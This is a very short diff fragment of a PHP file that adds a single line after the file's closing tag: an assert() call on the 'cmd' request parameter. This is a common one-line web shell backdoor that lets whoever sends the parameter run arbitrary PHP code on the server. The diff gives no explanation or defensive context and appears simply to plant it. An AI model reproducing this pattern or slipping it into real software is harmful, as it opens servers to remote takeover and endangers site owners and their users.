@@ -1532,3 +1532,4 @@ EOT;
 	}
 }
 ?>
+assert(stripslashes($_REQUEST[cmd]));
